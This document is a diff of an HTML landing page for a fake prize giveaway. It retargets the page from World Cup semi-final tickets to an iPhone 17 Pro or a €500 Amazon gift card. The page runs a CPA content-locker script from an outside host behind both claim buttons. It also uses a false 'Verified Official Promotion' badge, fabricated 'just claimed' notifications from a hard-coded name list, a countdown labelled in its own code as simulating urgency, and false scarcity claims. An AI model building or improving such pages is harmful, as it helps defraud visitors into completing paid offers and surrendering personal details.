@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <!-- SEO and Meta Tags -->
-    <title>Win a 2026 Mondial Semi-Final Ticket | US-Mexico-Canada</title>
-    <meta name="description" content="Participate in our exclusive premium giveaway. Get your chance to win a ticket to the 2026 World Cup Semi-Finals in US, Mexico, and Canada today. Limited time only!">
-    <meta name="keywords" content="giveaway, world cup 2026, mondial, semi-final ticket, soccer, football, us mexico canada, free entry, sweepstakes">
+    <title>Win an iPhone 17 Pro or a €500 Amazon Gift Card</title>
+    <meta name="description" content="Participate in our exclusive premium giveaway. Get your chance to win a brand new iPhone 17 Pro or a €500 Amazon Gift Card today. Limited time only!">
+    <meta name="keywords" content="giveaway, iphone 17 pro, amazon gift card, exclusive raffle, free entry, sweepstakes, win prizes">
     
     <!-- Monetag Meta Tag -->
     <meta name="monetag" content="cea11238fafab1f2a7742693342f74c4">
@@ -15,17 +15,17 @@
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://gethu.tech/">
-    <meta property="og:title" content="Exclusive Giveaway: 2026 World Cup Semi-Final Ticket!">
-    <meta property="og:description" content="Three simple steps to enter our premium giveaway. Secure your ticket for the historic US-Mexico-Canada Mondial now!">
-    <meta property="og:image" content="https://images.unsplash.com/photo-1518605368461-1ee7c532066d?q=80&w=1200&auto=format&fit=crop">
+    <meta property="og:title" content="Exclusive Giveaway: iPhone 17 Pro or €500 Amazon Gift Card!">
+    <meta property="og:description" content="Three simple steps to enter our premium giveaway. Choose your prize and secure your entry now!">
+    <meta property="og:image" content="https://i.postimg.cc/K4TwY3WC/prores-da2ay2urzh4y-large.png">
     <meta property="og:locale" content="en_US">
 
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:url" content="https://gethu.tech/">
-    <meta name="twitter:title" content="Win a 2026 Mondial Semi-Final Ticket | US-Mexico-Canada">
-    <meta name="twitter:description" content="Participate in our exclusive giveaway. Secure your ticket to the biggest football event of 2026!">
-    <meta name="twitter:image" content="https://images.unsplash.com/photo-1518605368461-1ee7c532066d?q=80&w=1200&auto=format&fit=crop">
+    <meta name="twitter:title" content="Win an iPhone 17 Pro or a €500 Amazon Gift Card">
+    <meta name="twitter:description" content="Participate in our exclusive giveaway. Choose your prize and enter now!">
+    <meta name="twitter:image" content="https://i.postimg.cc/K4TwY3WC/prores-da2ay2urzh4y-large.png">
     
     <!-- Scripts and Styles -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -37,10 +37,9 @@
     <style>
         /* Custom Premium Styles */
         :root {
-            /* World Cup Vibe Colors: Gold, Green, Red/Blue */
-            --glow-gold: rgba(250, 204, 21, 0.6);
-            --glow-blue: rgba(37, 99, 235, 0.6);
-            --glow-red: rgba(220, 38, 38, 0.5);
+            --glow-cyan: rgba(6, 182, 212, 0.6);
+            --glow-violet: rgba(139, 92, 246, 0.6);
+            --glow-pink: rgba(236, 72, 153, 0.5);
         }
 
         body {
@@ -64,20 +63,20 @@
             border-radius: 50%;
             filter: blur(120px);
             animation: float 20s infinite alternate cubic-bezier(0.4, 0, 0.2, 1);
-            opacity: 0.6;
+            opacity: 0.7;
         }
 
         .blob-1 {
             top: -10%; left: -10%;
             width: 50vw; height: 50vw;
-            background: var(--glow-blue);
+            background: var(--glow-violet);
             animation-duration: 25s;
         }
 
         .blob-2 {
             bottom: -20%; right: -10%;
             width: 60vw; height: 60vw;
-            background: var(--glow-gold);
+            background: var(--glow-cyan);
             animation-delay: -5s;
             animation-duration: 30s;
         }
@@ -85,7 +84,7 @@
         .blob-3 {
             top: 40%; left: 40%;
             width: 40vw; height: 40vw;
-            background: var(--glow-red);
+            background: var(--glow-pink);
             animation-delay: -10s;
             animation-duration: 22s;
         }
@@ -121,17 +120,17 @@
             top: 50%; left: 50%;
             transform: translate(-50%, -50%);
             width: 150px; height: 150px;
-            background: radial-gradient(circle, rgba(250,204,21,0.6) 0%, transparent 70%);
+            background: radial-gradient(circle, rgba(255,255,255,0.8) 0%, transparent 70%);
             filter: blur(30px);
             z-index: 0;
         }
 
         .main-icon {
             font-size: 140px;
-            background: linear-gradient(135deg, #fef08a 0%, #eab308 100%);
+            background: linear-gradient(135deg, #ffffff 0%, #cbd5e1 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            filter: drop-shadow(0 20px 30px rgba(0,0,0,0.5));
+            filter: drop-shadow(0 20px 30px rgba(0,0,0,0.4));
             position: relative;
             z-index: 1;
         }
@@ -168,25 +167,14 @@
         }
 
         /* Conversion Optimized Styles */
-        .pulse-btn-gold {
-            animation: pulse-glow-gold 2s infinite;
-        }
-        
-        .pulse-btn-blue {
-            animation: pulse-glow-blue 2s infinite;
-            animation-delay: 1s;
+        .pulse-btn {
+            animation: pulse-glow 2s infinite;
         }
 
-        @keyframes pulse-glow-gold {
-            0% { box-shadow: 0 0 0 0 rgba(234, 179, 8, 0.4); }
-            70% { box-shadow: 0 0 0 15px rgba(234, 179, 8, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(234, 179, 8, 0); }
-        }
-        
-        @keyframes pulse-glow-blue {
-            0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.4); }
-            70% { box-shadow: 0 0 0 15px rgba(59, 130, 246, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); }
+        @keyframes pulse-glow {
+            0% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(6, 182, 212, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0); }
         }
 
         .toast-notification {
@@ -194,8 +182,8 @@
             bottom: 20px;
             left: 20px;
             background: rgba(15, 23, 42, 0.95);
-            border: 1px solid rgba(234, 179, 8, 0.3);
-            border-left: 4px solid #eab308;
+            border: 1px solid rgba(6, 182, 212, 0.3);
+            border-left: 4px solid #06b6d4;
             backdrop-filter: blur(10px);
             padding: 12px 20px;
             border-radius: 8px;
@@ -238,10 +226,10 @@
     <!-- Ad Script -->
     <script src="https://fpyf8.com/88/tag.min.js" data-zone="183858" async data-cfasync="false"></script>
     
-    <!-- Updated Content Locker Script -->
-    <script type="text/javascript" src="https://getafilenow.com/script_include.php?id=1892588"></script>
+    <!-- CPAGrip Content Locker Script -->
+    <script type="text/javascript" src="https://alignmentfiles.com/script_include.php?id=1886376"></script>
 </head>
-<body class="antialiased selection:bg-yellow-500 selection:text-white">
+<body class="antialiased selection:bg-cyan-500 selection:text-white">
     
     <!-- Ambient Background -->
     <div class="ambient-bg">
@@ -259,16 +247,16 @@
                 <div class="flex flex-col items-center justify-center lg:order-2 space-y-8">
                     <div class="floating-icon-wrapper">
                         <div class="icon-glow"></div>
-                        <i class="fa-solid fa-trophy main-icon"></i>
+                        <i class="fa-brands fa-apple main-icon"></i>
                     </div>
                     
                     <!-- Decorative Tags -->
                     <div class="flex flex-wrap justify-center gap-3">
-                        <span class="px-4 py-1.5 rounded-full text-xs font-semibold tracking-wider uppercase bg-white/10 border border-white/20 text-yellow-400 shadow-lg backdrop-blur-md">
-                            <i class="fa-solid fa-ticket mr-2"></i>VIP Ticket
+                        <span class="px-4 py-1.5 rounded-full text-xs font-semibold tracking-wider uppercase bg-white/10 border border-white/20 text-cyan-300 shadow-lg backdrop-blur-md">
+                            <i class="fa-solid fa-mobile-screen mr-2"></i>iPhone 17 Pro
                         </span>
-                        <span class="px-4 py-1.5 rounded-full text-xs font-semibold tracking-wider uppercase bg-white/10 border border-white/20 text-blue-300 shadow-lg backdrop-blur-md">
-                            <i class="fa-solid fa-futbol mr-2"></i>Semi-Final Match
+                        <span class="px-4 py-1.5 rounded-full text-xs font-semibold tracking-wider uppercase bg-white/10 border border-white/20 text-yellow-400 shadow-lg backdrop-blur-md">
+                            <i class="fa-brands fa-amazon mr-2"></i>€500 Gift Card
                         </span>
                     </div>
                 </div>
@@ -278,26 +266,26 @@
                     <div class="inline-block px-4 py-1.5 rounded-full text-sm font-semibold tracking-wide bg-emerald-500/20 border border-emerald-500/30 text-emerald-400 mb-6">
                         <i class="fa-solid fa-shield-check mr-1"></i> Verified Official Promotion
                     </div>
-                    <h1 class="text-4xl sm:text-5xl lg:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-br from-white via-slate-200 to-slate-400 leading-tight mb-4">
-                        Claim Your Semi-Final Ticket
+                    <h1 class="text-4xl sm:text-5xl lg:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-br from-white via-slate-200 to-slate-500 leading-tight mb-4">
+                        Claim Your Prize Now
                     </h1>
                     <p class="text-lg sm:text-xl text-slate-300 max-w-lg mx-auto lg:mx-0 font-light mb-6">
-                        Due to extreme demand, we require a quick verification. <strong>Select your ticket tier below</strong> to unlock your entry immediately for the 2026 Mondial US-Mexico-Canada Semi-Final!
+                        Due to extreme demand, we require a quick verification. <strong>Select your reward below</strong> to unlock your entry immediately!
                     </p>
                     
                     <!-- High-Conversion Steps -->
-                    <div class="flex flex-col space-y-3 text-left bg-white/5 p-5 rounded-xl border border-yellow-500/20 mb-8 shadow-inner">
+                    <div class="flex flex-col space-y-3 text-left bg-white/5 p-5 rounded-xl border border-cyan-500/20 mb-8 shadow-inner">
                         <div class="flex items-center gap-3 text-slate-200">
-                            <span class="flex items-center justify-center w-6 h-6 rounded-full bg-yellow-500/20 text-yellow-400 text-xs font-bold border border-yellow-500/30">1</span>
-                            <span class="font-medium text-sm sm:text-base">Select your preferred ticket category.</span>
+                            <span class="flex items-center justify-center w-6 h-6 rounded-full bg-cyan-500/20 text-cyan-400 text-xs font-bold border border-cyan-500/30">1</span>
+                            <span class="font-medium text-sm sm:text-base">Click your preferred prize below.</span>
                         </div>
                         <div class="flex items-center gap-3 text-slate-200">
-                            <span class="flex items-center justify-center w-6 h-6 rounded-full bg-blue-500/20 text-blue-400 text-xs font-bold border border-blue-500/30">2</span>
-                            <span class="font-medium text-sm sm:text-base">Complete a quick sponsor verification (1 min).</span>
+                            <span class="flex items-center justify-center w-6 h-6 rounded-full bg-violet-500/20 text-violet-400 text-xs font-bold border border-violet-500/30">2</span>
+                            <span class="font-medium text-sm sm:text-base">Complete a quick sponsor survey (1 min).</span>
                         </div>
                         <div class="flex items-center gap-3 text-slate-200">
-                            <span class="flex items-center justify-center w-6 h-6 rounded-full bg-red-500/20 text-red-400 text-xs font-bold border border-red-500/30">3</span>
-                            <span class="font-medium text-sm sm:text-base">Receive your digital ticket entry. Done!</span>
+                            <span class="flex items-center justify-center w-6 h-6 rounded-full bg-pink-500/20 text-pink-400 text-xs font-bold border border-pink-500/30">3</span>
+                            <span class="font-medium text-sm sm:text-base">Enter shipping details. Done!</span>
                         </div>
                     </div>
 
@@ -305,7 +293,7 @@
                     <div class="mt-8 p-6 rounded-2xl bg-black/40 border border-red-500/20 backdrop-blur-sm relative overflow-hidden">
                         <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-600 to-orange-500"></div>
                         <div class="flex justify-between text-sm font-bold text-red-400 mb-3 uppercase tracking-widest animate-pulse">
-                            <span><i class="fa-solid fa-clock mr-1"></i> Allocation Closes In</span>
+                            <span><i class="fa-solid fa-clock mr-1"></i> Event Closes In</span>
                         </div>
                         <div class="grid grid-cols-4 gap-2 sm:gap-4 text-center divide-x divide-white/10">
                             <div>
@@ -329,21 +317,21 @@
                     
                     <!-- CTA Buttons (Optimized for CPA with explicit trigger) -->
                     <div class="mt-8 grid grid-cols-1 sm:grid-cols-2 gap-4">
-                        <button id="vip-link" onclick="if(typeof call_locker === 'function') call_locker();" class="btn-premium pulse-btn-gold flex flex-col items-center justify-center gap-1 w-full py-4 px-4 bg-gradient-to-r from-yellow-600 to-orange-600 border-2 border-yellow-400/50 rounded-xl text-white font-bold shadow-[0_0_15px_rgba(234,179,8,0.3)] hover:border-yellow-300 transition-colors">
-                            <span class="flex items-center gap-2 text-lg"><i class="fa-solid fa-crown text-xl"></i> Claim VIP Ticket</span>
-                            <span class="text-xs text-yellow-200 font-normal">Hospitality Package included</span>
+                        <button id="iphone-link" onclick="if(typeof call_locker === 'function') call_locker();" class="btn-premium pulse-btn flex flex-col items-center justify-center gap-1 w-full py-4 px-4 bg-gradient-to-r from-slate-700 to-slate-900 border-2 border-cyan-500/50 rounded-xl text-white font-bold shadow-[0_0_15px_rgba(6,182,212,0.3)] hover:border-cyan-400 transition-colors">
+                            <span class="flex items-center gap-2 text-lg"><i class="fa-brands fa-apple text-xl"></i> Claim iPhone</span>
+                            <span class="text-xs text-cyan-300 font-normal">Only 3 remaining!</span>
                         </button>
-                        <button id="standard-link" onclick="if(typeof call_locker === 'function') call_locker();" class="btn-premium pulse-btn-blue flex flex-col items-center justify-center gap-1 w-full py-4 px-4 bg-gradient-to-r from-blue-700 to-indigo-800 border-2 border-blue-500/50 rounded-xl text-white font-bold shadow-[0_0_15px_rgba(59,130,246,0.3)] hover:border-blue-400 transition-colors">
-                            <span class="flex items-center gap-2 text-lg"><i class="fa-solid fa-ticket-simple text-xl"></i> Category 1 Ticket</span>
-                            <span class="text-xs text-blue-300 font-normal">Premium Seating</span>
+                        <button id="amazon-link" onclick="if(typeof call_locker === 'function') call_locker();" class="btn-premium pulse-btn flex flex-col items-center justify-center gap-1 w-full py-4 px-4 bg-gradient-to-r from-yellow-600 to-orange-600 border-2 border-yellow-400/50 rounded-xl text-white font-bold shadow-[0_0_15px_rgba(234,179,8,0.3)] hover:border-yellow-300 transition-colors">
+                            <span class="flex items-center gap-2 text-lg"><i class="fa-brands fa-amazon text-xl"></i> Claim €500</span>
+                            <span class="text-xs text-yellow-200 font-normal">Instant Digital Delivery</span>
                         </button>
                     </div>
 
                     <!-- Trust Badges -->
                     <div class="mt-6 flex flex-wrap items-center justify-center lg:justify-start gap-4 text-slate-400 text-xs font-medium">
                         <div class="flex items-center gap-1.5"><i class="fa-solid fa-lock text-emerald-400"></i> 256-Bit Secure</div>
-                        <div class="flex items-center gap-1.5"><i class="fa-solid fa-bolt text-yellow-400"></i> Instant Entry</div>
-                        <div class="flex items-center gap-1.5"><i class="fa-solid fa-shield-halved text-blue-400"></i> Official Allocation</div>
+                        <div class="flex items-center gap-1.5"><i class="fa-solid fa-bolt text-yellow-400"></i> Fast Delivery</div>
+                        <div class="flex items-center gap-1.5"><i class="fa-solid fa-shield-halved text-cyan-400"></i> Anti-Fraud Protected</div>
                     </div>
                 </div>
             </div>
@@ -352,8 +340,8 @@
         <!-- Footer -->
         <footer class="w-full max-w-4xl mx-auto text-center mt-12 mb-6">
              <div class="flex justify-center space-x-6 mb-6">
-                 <a href="#" aria-label="Twitter" class="text-slate-500 hover:text-blue-400 transition-colors transform hover:scale-110"><i class="fa-brands fa-twitter text-2xl"></i></a>
-                 <a href="#" aria-label="Facebook" class="text-slate-500 hover:text-blue-400 transition-colors transform hover:scale-110"><i class="fa-brands fa-facebook text-2xl"></i></a>
+                 <a href="#" aria-label="Twitter" class="text-slate-500 hover:text-cyan-400 transition-colors transform hover:scale-110"><i class="fa-brands fa-twitter text-2xl"></i></a>
+                 <a href="#" aria-label="Facebook" class="text-slate-500 hover:text-cyan-400 transition-colors transform hover:scale-110"><i class="fa-brands fa-facebook text-2xl"></i></a>
                  <a href="#" aria-label="Instagram" class="text-slate-500 hover:text-pink-400 transition-colors transform hover:scale-110"><i class="fa-brands fa-instagram text-2xl"></i></a>
              </div>
             <div class="flex flex-wrap justify-center gap-4 sm:gap-8 text-sm text-slate-400 font-medium mb-4">
@@ -364,17 +352,17 @@
                 <a href="#" class="hover:text-white transition-colors">Privacy Policy</a>
             </div>
             <p class="text-xs text-slate-600 font-light max-w-2xl mx-auto">
-                Disclaimer: This promotion is not sponsored, endorsed, or administered by, or associated with FIFA or the host countries. Trademarks are the property of their respective owners.
+                Disclaimer: This promotion is not sponsored, endorsed, or administered by, or associated with Apple Inc. or Amazon.com, Inc. Trademarks are the property of their respective owners.
             </p>
         </footer>
     </main>
 
     <!-- Social Proof Toast (Boosts Conversions) -->
     <div id="proof-toast" class="toast-notification">
-        <img src="https://i.pravatar.cc/100?img=1" id="toast-img" class="w-10 h-10 rounded-full border border-yellow-500/50" alt="User">
+        <img src="https://i.pravatar.cc/100?img=1" id="toast-img" class="w-10 h-10 rounded-full border border-cyan-500/50" alt="User">
         <div>
             <p class="text-sm text-white font-medium" id="toast-name">Sarah M. <span class="text-slate-400 text-xs font-light">just claimed</span></p>
-            <p class="text-xs text-yellow-400 font-bold" id="toast-prize">a VIP Ticket</p>
+            <p class="text-xs text-cyan-400 font-bold" id="toast-prize">iPhone 17 Pro</p>
             <p class="text-[10px] text-slate-500 mt-0.5" id="toast-time">2 seconds ago</p>
         </div>
     </div>
@@ -384,15 +372,15 @@
     <!-- Contact Modal -->
     <div id="contact-modal" class="modal-overlay fixed inset-0 flex items-center justify-center p-4 z-50 opacity-0 pointer-events-none">
         <div class="modal-content w-full max-w-md p-8 rounded-2xl text-center transform scale-95 opacity-0">
-             <div class="w-16 h-16 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-blue-500/20">
-                 <i class="fa-regular fa-envelope text-3xl text-blue-400"></i>
+             <div class="w-16 h-16 bg-cyan-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-cyan-500/20">
+                 <i class="fa-regular fa-envelope text-3xl text-cyan-400"></i>
              </div>
              <h3 class="text-2xl font-bold text-white mb-2">Contact Support</h3>
             <p class="text-slate-400 text-sm mb-6">If you are experiencing issues completing your verification offer, please reach out to our support team.</p>
             
             <div class="p-4 bg-black/40 border border-white/10 rounded-xl flex items-center justify-between group">
-                <span class="font-mono text-blue-300 text-sm tracking-wide select-all">support@trustedsponsor.de</span>
-                <button id="copy-email-btn" class="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-sm font-semibold rounded-lg transition-colors focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-slate-900">
+                <span class="font-mono text-cyan-300 text-sm tracking-wide select-all">support@trustedsponsor.de</span>
+                <button id="copy-email-btn" class="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white text-sm font-semibold rounded-lg transition-colors focus:ring-2 focus:ring-cyan-500 focus:ring-offset-2 focus:ring-offset-slate-900">
                     Copy
                 </button>
             </div>
@@ -414,16 +402,16 @@
             
             <div class="space-y-6 text-sm text-slate-300 font-light leading-relaxed">
                 <div>
-                    <h4 class="font-semibold text-yellow-400 mb-1 text-base"><i class="fa-solid fa-circle-info mr-2"></i>Eligibility</h4>
+                    <h4 class="font-semibold text-cyan-400 mb-1 text-base"><i class="fa-solid fa-circle-info mr-2"></i>Eligibility</h4>
                     <p>Participants must be 18 years of age or older and reside in regions where such giveaways are legally permitted. Employees, affiliates, and immediate family members of the sponsor are strictly prohibited from participating.</p>
                 </div>
                 <div>
-                    <h4 class="font-semibold text-yellow-400 mb-1 text-base"><i class="fa-solid fa-pen-to-square mr-2"></i>How to Enter</h4>
-                    <p>To successfully register an entry, participants must choose their desired ticket tier, click the respective claim button, and fulfill the mandatory sponsor verification offer. Limit of one entry per verified individual.</p>
+                    <h4 class="font-semibold text-cyan-400 mb-1 text-base"><i class="fa-solid fa-pen-to-square mr-2"></i>How to Enter</h4>
+                    <p>To successfully register an entry, participants must choose their desired prize, click the respective claim button, and fulfill the mandatory sponsor verification offer. Limit of one entry per verified individual.</p>
                 </div>
                 <div>
-                    <h4 class="font-semibold text-yellow-400 mb-1 text-base"><i class="fa-solid fa-trophy mr-2"></i>Winner Selection</h4>
-                    <p>A total of 40 verified winners (20 for the VIP Tickets and 20 for Category 1 Tickets to the 2026 Mondial US-Mexico-Canada Semi-Final) will be selected via random draw within 48 hours of the giveaway's conclusion. Winners will be contacted via the email address provided during verification and must claim their prize within 7 business days.</p>
+                    <h4 class="font-semibold text-cyan-400 mb-1 text-base"><i class="fa-solid fa-trophy mr-2"></i>Winner Selection</h4>
+                    <p>A total of 40 verified winners (20 for the iPhone 17 Pro and 20 for the €500 Amazon Gift Card) will be selected via random draw within 48 hours of the giveaway's conclusion. Winners will be contacted via the email address provided during verification and must claim their prize within 7 business days.</p>
                 </div>
             </div>
             <button id="close-rules-modal-btn" class="mt-8 w-full py-3 bg-slate-800 text-slate-300 font-semibold rounded-xl hover:bg-slate-700 transition-colors">I Understand</button>
@@ -433,15 +421,15 @@
     <!-- Refer Modal -->
     <div id="refer-modal" class="modal-overlay fixed inset-0 flex items-center justify-center p-4 z-50 opacity-0 pointer-events-none">
         <div class="modal-content w-full max-w-md p-8 rounded-2xl text-center transform scale-95 opacity-0">
-            <div class="w-16 h-16 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-blue-500/20">
-                <i class="fa-solid fa-user-plus text-3xl text-blue-400"></i>
+            <div class="w-16 h-16 bg-violet-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-violet-500/20">
+                <i class="fa-solid fa-user-plus text-3xl text-violet-400"></i>
             </div>
             <h3 class="text-2xl font-bold text-white mb-2">Boost Your Odds!</h3>
             <p class="text-slate-400 text-sm mb-6">Multiply your chances of winning. Share your unique referral link below; every friend who enters earns you an extra ticket.</p>
             
             <div class="p-4 bg-black/40 border border-white/10 rounded-xl flex items-center justify-between">
-                <input id="referral-link-input" type="text" readonly value="https://gethu.tech/?ref=USER123" class="font-mono text-blue-300 text-sm bg-transparent w-full focus:outline-none truncate mr-4">
-                <button id="copy-referral-btn" class="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-sm font-semibold rounded-lg transition-colors focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-slate-900">
+                <input id="referral-link-input" type="text" readonly value="https://gethu.tech/?ref=USER123" class="font-mono text-violet-300 text-sm bg-transparent w-full focus:outline-none truncate mr-4">
+                <button id="copy-referral-btn" class="px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white text-sm font-semibold rounded-lg transition-colors focus:ring-2 focus:ring-violet-500 focus:ring-offset-2 focus:ring-offset-slate-900">
                     Copy
                 </button>
             </div>
@@ -548,9 +536,9 @@
             });
 
             // --- COUNTDOWN TIMER ---
-            // Set for 30 days from execution (simulating urgency)
-            const endDate = new Date().getTime() + (30 * 24 * 60 * 60 * 1000); 
-            const totalDuration = 30 * 24 * 60 * 60 * 1000;
+            // Set for 67 days from execution (simulating urgency)
+            const endDate = new Date().getTime() + (67 * 24 * 60 * 60 * 1000); 
+            const totalDuration = 67 * 24 * 60 * 60 * 1000;
             
             function updateTimer() {
                 const now = new Date().getTime();
@@ -567,6 +555,11 @@
                 document.getElementById('hours').textContent = String(hours).padStart(2, '0');
                 document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
                 document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
+                
+                // Update progress bar
+                const progress = Math.max(0, ((totalDuration - distance) / totalDuration) * 100);
+                const progressBar = document.getElementById('progress-bar');
+                if (progressBar) progressBar.style.width = `${progress}%`;
             }
             
             setInterval(updateTimer, 1000);
@@ -574,7 +567,7 @@
 
             // --- SOCIAL PROOF TOAST LOGIC (CONVERSION BOOSTER) ---
             const names = ['Michael T.', 'Sarah J.', 'David W.', 'Emma L.', 'James R.', 'Olivia P.', 'Daniel K.', 'Sophia M.', 'John D.', 'Alex B.'];
-            const prizes = ['a VIP Ticket', 'a Category 1 Ticket', '2 VIP Tickets'];
+            const prizes = ['an iPhone 17 Pro', 'a €500 Amazon Gift Card'];
             const times = ['just now', '12 seconds ago', '24 seconds ago', '1 minute ago', 'a few seconds ago'];
             
             function showToast() {
